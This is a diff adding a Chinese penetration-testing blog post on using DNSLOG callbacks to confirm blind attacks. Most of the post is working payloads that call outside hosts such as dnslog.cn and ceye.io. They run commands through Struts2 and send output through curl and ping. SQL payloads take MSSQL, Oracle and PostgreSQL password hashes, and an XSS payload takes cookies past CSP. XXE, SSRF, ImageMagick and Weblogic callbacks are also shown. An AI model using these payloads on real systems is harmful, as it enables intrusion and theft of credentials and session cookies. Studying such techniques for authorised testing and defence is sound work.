@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="content-language" content="zh-CN"/>
+    <meta name="author" content="WeiyiGeek" />
+    <meta name="msvalidate.01" content="5C552FB1D885E0E11D2957EC958C8018" />
+    <meta name="shenma-site-verification" content="4c655e91c76be0a93c1b6954c666c9d6_1649049085"/>
+    <meta name="bytedance-verification-code" content="lKs4FqwCHSJ3A/c5tT7X" />
+    <meta name="sogou_site_verification" content="OC65iET6Bk" />
+    
+    <title>🌐 模糊测试之攻击回显|WeiyiGeek Blog|唯一极客Geek-IT网络安全运维开发技术知识分享-博客站点</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    <meta name="keywords" content="Fuzz">
+    <meta name="Description" content="WeiyiGeek-唯一极客博客站点,关注于网络安全运维,Web安全开发,IOT物联网安全开发,应用开发,分享技术学习知识与入坑解决,提升网络安全技术与自身技术能力,立志维护大众网络安全为己任,做一个对国家有用的人,为实现中华民族伟大复兴的中国梦不懈奋斗">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="/css/jquery/3.5.2-jquery.fancybox.min.css?v=1.6.6" />
+    <link rel="stylesheet" href="/css/style.css?v=1.6.6">
+    <!--  -->
+     <script type="text/javascript" src="/js/custom/articlecost.js?v=1.6.6"></script> 
+    <link rel="stylesheet" href="/css/third-party/gitalk.css?v=1.6.6"> 
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}')
+        };
+    </script>
+    <script type="text/javascript">window.lazyScripts=[];</script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="WeiyiGeek Blog" type="application/atom+xml">
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg" alt="WeiyiGeek-backgroud">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg" alt="WeiyiGeek-头像">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">WeiyiGeek</h5>
+          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
+            <span>m</span><span>a</span><span>s</span><span>t</span><span>e</span><span>r</span><span>@</span><span>w</span><span>e</span><span>i</span><span>y</span><span>i</span><span>g</span><span>e</span><span>e</span><span>k</span><span>.</span><span>t</span><span>o</span><span>p</span>
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank">
+                  <i class="icon icon-lg icon-wechat"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/weiyigeek" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://t.me/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-telegram"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://twitter.com/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-twitter"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://weibo.com/615643678" target="_blank">
+                  <i class="icon icon-lg icon-weibo"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                文章标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/books"  >
+                <i class="icon icon-lg icon-book"></i>
+                学习书籍
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于作者
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                站点导航
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weiyigeek.top/img/wechat-search.png" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                公众账号
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://space.bilibili.com/385802642" target="_blank" >
+                <i class="icon icon-lg icon-youtube-play"></i>
+                哔哩哔哩
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/weiyigeek" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://twitter.com/WeiyiGeek" target="_blank" >
+                <i class="icon icon-lg icon-twitter"></i>
+                Twitter
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weibo.com/615643678" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>模糊测试之攻击回显</span>
+            
+        </div>
+
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+
+        
+            <a href="/atom.xml" class="header-icon pull-right waves-effect waves-circle waves-light">
+                <i class="icon icon-lg icon-rss"></i>
+            </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg" alt="文章头部背景">
+    <div class="container fade-scale">
+        <h1 class="title">模糊测试之攻击回显</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-17T11:34:30.000Z" itemprop="datePublished" class="page-time">
+  2019-04-17
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB/">网安大类</a></li></ul>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-网安大类/FuzzTesting/模糊测试之攻击回显"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">模糊测试之攻击回显</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-17 19:34:30" datetime="2019-04-17T11:34:30.000Z"  itemprop="datePublished">2019-04-17</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E7%BD%91%E5%AE%89%E5%A4%A7%E7%B1%BB/">网安大类</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>[TOC]</p>
+<a id="more"></a>
+<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>描述：一个渗透安全工程师常常会在,某些安全测试项目中遇到,代码或者命令可以被执行,但是无任何的回显特征来判断攻击成功，</p>
+<ul>
+<li>比如存在SSRF漏洞还可以利用回显来查看是否攻击成功(大部分),但是也存在SSRF无回显漏洞以及在XXE相关的漏洞(诸如Blind XXE和Blind SSRF之类的漏洞上)利用上也需要它;</li>
+<li>再比如当再实际渗透测试中SQL盲注、命令盲注等漏洞是较难利用的由于无回显这类漏洞即使存在也显得有些鸡肋。针对此类问题我们可以使用DNSLOG来进行突破。</li>
+</ul>
+<h4 id="DNSlogFuzz渗透中的使用"><a href="#DNSlogFuzz渗透中的使用" class="headerlink" title="DNSlogFuzz渗透中的使用"></a>DNSlogFuzz渗透中的使用</h4><p>描述:DNSLOG是一种回显机制，使用者可以通过DNS解析日志来读取漏洞的回显;</p>
+<p><strong>1.DNSLOG的原理</strong><br>DNS的解析是递归与迭代相结合的，当我们访问一个根域的时候DNS的解析过程示意图,其中红色部分是可控的。<br><figure class="image-box">
+                <a rel=模糊测试之攻击回显 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190813142045.png" target="_blank" title="WeiyiGeek.参考Freebuf" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190813142045.png" alt="WeiyiGeek.参考Freebuf" title="" class=""></a>
+                <p>WeiyiGeek.参考Freebuf</p>
+            </figure></p>
+<p>我们只需要搭建一个红色部分的DNS服务器，并将要盲打或盲注的回显，放到自己域名的二级甚至三级域名上去请求，就可以通过DNS解析日志来获取到它们。</p>
+<p>比如: 在 <a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> 中申请一个域名然后,在对其子域名进行ping操作就能看到回显;<br><figure class="image-box">
+                <a rel=模糊测试之攻击回显 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190809150048.png" target="_blank" title="WeiyiGeek.DNSLOG回显" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20190809150048.png" alt="WeiyiGeek.DNSLOG回显" title="" class=""></a>
+                <p>WeiyiGeek.DNSLOG回显</p>
+            </figure></p>
+<p><br></p>
+<p><strong>2.DNSlog服务器自己搭建</strong><br>当然您也可以自建一个这样的平台直接使用BugScan团队开源的工具搭建即可,前提是您需要有自己的服务器和域名，</p>
+<ul>
+<li><a href="https://github.com/BugScanTeam/DNSLog" target="_blank" rel="noopener">https://github.com/BugScanTeam/DNSLog</a></li>
+</ul>
+<p>或者使用在线平台:</p>
+<ul>
+<li><a href="http://www.dnslog.cn/" target="_blank" rel="noopener">http://www.dnslog.cn/</a> (推荐使用无需注册)</li>
+<li><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a></li>
+<li><a href="https://www.t00ls.net/dnslog.html" target="_blank" rel="noopener">https://www.t00ls.net/dnslog.html</a></li>
+</ul>
+<p><br><br><strong>3.DNSlog使用场景和思路</strong><br><em>场景零：不同命令执行回显</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux下：</span></span><br><span class="line">curl http://ip.port.b182oj.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.ip.port.b182oj.ceye.io</span><br><span class="line"></span><br><span class="line"><span class="comment">#Win下：</span></span><br><span class="line">ping %USERNAME%.b182oj.ceye.io</span><br><span class="line">变量                     类型       描述</span><br><span class="line">%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class="line">%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class="line">%CD%                     本地       返回当前目录字符串。</span><br><span class="line">%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class="line">%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class="line">%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class="line">%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class="line">%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class="line">%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class="line">%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class="line">%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。</span><br><span class="line">%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。</span><br><span class="line">%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</span><br><span class="line">%PATH%                   系统       指定可执行文件的搜索路径。</span><br><span class="line">%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。</span><br><span class="line">%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。</span><br><span class="line">%PROCESSOR_IDENTFIER%    系统       返回处理器说明。</span><br><span class="line">%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。</span><br><span class="line">%PROCESSOR_REVISION%     系统       返回处理器的版本号。</span><br><span class="line">%PROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。</span><br><span class="line">%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。</span><br><span class="line">%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。</span><br><span class="line">%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。</span><br><span class="line">%TEMP%和%TMP%            系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。</span><br><span class="line">%TIME%                   系统       返回当前时间。使用与timet 命令相同的格式。由 Cmd.ex 生成。</span><br><span class="line">%USERDOMAIN%             本地       返回包含用户帐户的域的名称。</span><br><span class="line">%USERNAME%               本地       返回当前登录的用户的名称。</span><br><span class="line">%USERPROFILE%            本地       返回当前用户的配置文件的位置。</span><br><span class="line">%WINDIR%                 系统       返回操作系统目录的位置。</span><br></pre></td></tr></table></figure></p>
+<p><em>场景一：命令盲注回显</em><br>比如:17年9月爆发的Struts2-052反序列化命令执行漏洞是看不到任何回显的,针对这种情况我们可以利用DNSLOG来获取命令的执行结果;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Struts2</span></span><br><span class="line">xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;</span><br><span class="line">xx.action?redirect:<span class="variable">$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;'whoami'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d<span class="string">"http://ip.port.b182oj.ceye.io/result%3d"</span>.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(<span class="string">"GET"</span>),%23http.connect(),%23http.getInputStream()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#Payload</span></span><br><span class="line">go run main.go -u <span class="string">"http://202.114.**.***/view/index.action"</span> -c <span class="string">'curl "http://`id`.2ojptq.dnslog.cn"'</span></span><br><span class="line"><span class="comment">#回显请求</span></span><br><span class="line">DNS Query Record	IP Address	Created Time</span><br><span class="line">root.2ojptq.dnslog.cn	**.204.65.56	2019-08-13 14:44:58</span><br></pre></td></tr></table></figure></p>
+<p>Playload解析：</p>
+<ul>
+<li>根据语法规定会先将双引号中的whoami命令执行并替换为结果，再执行整个的curl命令。</li>
+<li>注意为了防止内容不适合作为域名的一部分我们也可以base64编码后再进行请求。 (小技巧)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方式1：针对于域名base64编码</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"http://`id`.2ojptq.dnslog.cn"</span> | base64</span><br><span class="line">aHR0cDovL3VpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLjJvanB0cS5kbnNsb2cuY24K</span><br><span class="line"><span class="comment">#base64编码请求</span></span><br><span class="line">go run main.go -u <span class="string">"http://202.114.**.***/view/index.action"</span> -c <span class="string">'curl $(echo "aHR0cDovL3VpZD0wKHJvb3QpIGdpZD0wKHJvb3QpIGdyb3Vwcz0wKHJvb3QpLjJvanB0cS5kbnNsb2cuY24K" | base64 -d)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#方式2：针对于域名base64编码(需要注意URL有长度限制-推荐方式)</span></span><br><span class="line">go run main.go -u <span class="string">"http://202.114.**.***/view/index.action"</span> -c <span class="string">'curl "http://`id|base64`.2ojptq.dnslog.cn"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#请求结果</span></span><br><span class="line">DNS Query Record	IP Address	Created Time</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root).2ojptq.dnslog.cn	***.204.**.56	2019-08-13 15:07:17</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><br></p>
+<p><em>场景二：SQL盲注回显</em><br>描述：我们常常遇到在 <code>bool型盲注</code> 和 <code>时间类型盲注</code>, 都需要频繁的跑请求才能够获取数据库中的值,在现代WAF的防护下很可能导致IP被ban;<br>利用方法：如遇到MySql的盲注时我们可以结合DNSLOG完美快速的将数据取出，可以利用内置函数load_file()来完成DNSLOG</p>
+<p>(小技巧): load_file()不仅能够加载本地文件同时也能对诸如\<a href="http://www.test.com这样的URL发起请求。" target="_blank" rel="noopener">www.test.com这样的URL发起请求。</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#利用条件</span></span><br><span class="line">1.有file权限的数据库用户</span><br><span class="line">2.且开启allow_url_fopen(默认开启)</span><br><span class="line">3.secure_file_priv=/date/ <span class="comment">#就只能读取该目录文件</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Payload:</span></span><br><span class="line">select load_file(concat(<span class="string">'\\\\'</span>, user(), <span class="string">'.4q9z30.dnslog.cn'</span>));</span><br><span class="line">http://127.0.0.1/fuzz/?id=1 and <span class="keyword">if</span>((select load_file(concat(0x7c,(select database()),<span class="string">'.4q9z30.dnslog.cn'</span>))),1,1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看执行效果 (非常鸡肋,不容易成功)</span></span><br><span class="line">root@localhost.4q9z30.dnslog.cn **.**.**.** 	2019-07-27 09:45</span><br></pre></td></tr></table></figure>
+<p>补充利用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SQL Server</span></span><br><span class="line">DECLARE @host varchar(1024);</span><br><span class="line">SELECT @host=(SELECT TOP 1</span><br><span class="line">master.dbo.fn_varbintohexstr(password_hash)</span><br><span class="line">FROM sys.sql_logins WHERE name=<span class="string">'sa'</span>)</span><br><span class="line">+<span class="string">'.ip.port.b182oj.ceye.io'</span>;</span><br><span class="line">EXEC(<span class="string">'master..xp_dirtree</span></span><br><span class="line"><span class="string">"\\'</span>+@host+<span class="string">'\foobar$"'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#Oracle</span></span><br><span class="line">SELECT UTL_INADDR.GET_HOST_ADDRESS(<span class="string">'ip.port.b182oj.ceye.io'</span>);</span><br><span class="line">SELECT UTL_HTTP.REQUEST(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>) FROM DUAL;</span><br><span class="line">SELECT HTTPURITYPE(<span class="string">'http://ip.port.b182oj.ceye.io/oracle'</span>).GETCLOB() FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((<span class="string">'oracle.ip.port.b182oj.ceye.io'</span>,80) FROM DUAL;</span><br><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=<span class="string">'SYS'</span>)||<span class="string">'.ip.port.b182oj.ceye.io'</span>,80) FROM DUAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">#PostgreSQL</span></span><br><span class="line">DROP TABLE IF EXISTS table_output;</span><br><span class="line">CREATE TABLE table_output(content text);</span><br><span class="line">CREATE OR REPLACE FUNCTION temp_function()</span><br><span class="line">RETURNS VOID AS $</span><br><span class="line">DECLARE exec_cmd TEXT;</span><br><span class="line">DECLARE query_result TEXT;</span><br><span class="line">BEGIN</span><br><span class="line">SELECT INTO query_result (SELECT passwd</span><br><span class="line">FROM pg_shadow WHERE usename=<span class="string">'postgres'</span>);</span><br><span class="line">exec_cmd := E<span class="string">'COPY table_output(content)</span></span><br><span class="line"><span class="string">FROM E\'</span>\\\\\\\\<span class="string">'||query_result||E'</span>.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\<span class="string">''</span>;</span><br><span class="line">EXECUTE exec_cmd;</span><br><span class="line">END;</span><br><span class="line">$ LANGUAGE plpgsql SECURITY DEFINER;</span><br><span class="line">SELECT temp_function();</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<p><em>场景三： XSS绕过CSP</em><br>描述:CSP(内容安全策略)是防御XSS最有效的手段之一,当我们发现一个网站有XSS漏洞，想利用XSS平台来打Cookie时，CSP会通过白名单的方式，禁止跨域加载脚本，恶意代码便会因此被阻挡在门外导致此XSS无法利用；对此我们可以使用DNS预解析突破CSP的阻拦。</p>
+<p>DNS预解析(DNS Prefetching)是一种能够加快网页加载速度的技术对于跨站的链接，由于每次都要进行一次DNS解析会消耗掉很多时间。<br>DNS预解析在浏览器空闲时，将跨站资源的域名转化为IP 地址并缓存，真正请求资源时就避免了解析的时间。</p>
+<p>有趣的是DNS预解析是默认开启的，并且我们可以通过<code>rel=&quot;dns-prefetch&quot;</code>来强制进行DNS预解析。<br>(重点)<code>由于DNS预解析可以绕过CSP进行解析</code>(重点)，结合DNSLOG我们即可窃取在CSP保护下的Cookie。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Payload</span></span><br><span class="line">document.querySelector(<span class="string">'body'</span>).innerHTML += <span class="string">"&lt;link rel='dns-prefetch' href='"</span> + window.btoa(document.cookie.split(/;|=/)[1]) + <span class="string">".4q9z30.dnslog.cn'&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#执行结果</span></span><br><span class="line">R0ExLjIuMTY0MjI2NDMxNi4xNTMyNTc0NTg3.4q9z30.dnslog.cn **.**.**.** 	2019-07-27 10:45</span><br></pre></td></tr></table></figure></p>
+<p><em>注意事项：</em></p>
+<ul>
+<li>根据DNS的规定域名的长度是有限制的，有时可能无法将长Cookie完全带出(需要进行分段)</li>
+</ul>
+<p><br></p>
+<p><em>场景四:SSRF无回显解决</em><br>描述：很多SSRF的漏洞类型都是无回显,利用DNS回显来查看利用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Playload:</span></span><br><span class="line">http://10.10.107.1:8080/ssrf.php?url=http://php.nf9eex.dnslog.cn</span><br></pre></td></tr></table></figure></p>
+<p><br><br><em>场景五:XXE无回显解决</em><br>描述：与xml格式相关的web漏洞传比较广泛的共有 xpath注入、xml注入、soap注入、XXE四种,在进行测试的时候往往也会遇到无回显的情况;<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://ip.port.b182oj.ceye.io/xxe_test"</span>&gt;</span><br><span class="line">%remote;]&gt;</span><br><span class="line">&lt;root/&gt;</span><br></pre></td></tr></table></figure></p>
+<p><br><br><em>场景六:其他漏洞攻击无回显解决</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FFMpeg</span></span><br><span class="line"><span class="comment">#EXTM3U</span></span><br><span class="line"><span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span></span><br><span class="line"><span class="comment">#EXTINF:10.0,</span></span><br><span class="line">concat:http://ip.port.b182oj.ceye.io</span><br><span class="line"><span class="comment">#EXT-X-ENDLIST</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Weblogic</span></span><br><span class="line">xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/<span class="built_in">test</span>&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ImageMagick</span></span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(http://ip.port.b182oj.ceye.io)'</span></span><br><span class="line">pop graphic-context</span><br><span class="line"></span><br><span class="line"><span class="comment">#Resin</span></span><br><span class="line">xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/<span class="built_in">test</span>?inputFile=http://ip.port.b182oj.ceye.io/ssrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo</span><br></pre></td></tr></table></figure></p>
+<p><em>参考来源：</em></p>
+<ul>
+<li>DNSlog原理: <a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a></li>
+<li>渗透使用方法: <a href="http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html" target="_blank" rel="noopener">http://www.admintony.com/DNSLog%E5%9C%A8%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8.html</a></li>
+</ul>
+<hr>
+
